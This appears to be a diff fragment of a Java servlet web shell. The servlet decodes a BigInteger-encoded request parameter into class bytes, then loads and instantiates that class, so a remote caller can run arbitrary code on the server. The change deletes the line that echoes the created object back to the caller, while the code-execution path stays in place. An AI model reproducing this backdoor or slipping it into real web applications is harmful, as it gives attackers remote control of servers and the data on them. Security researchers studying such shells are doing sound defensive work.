@@ -25,8 +25,7 @@ public class BigIntegerClassLaoderServlet extends ClassLoader implements Servlet
         String data = req.getParameter("data");
         try {
             byte[] bytes = decodeBigInteger(data);
-            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
-            res.getWriter().print(obj);
+            defineClass(null, bytes, 0, bytes.length).newInstance();
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
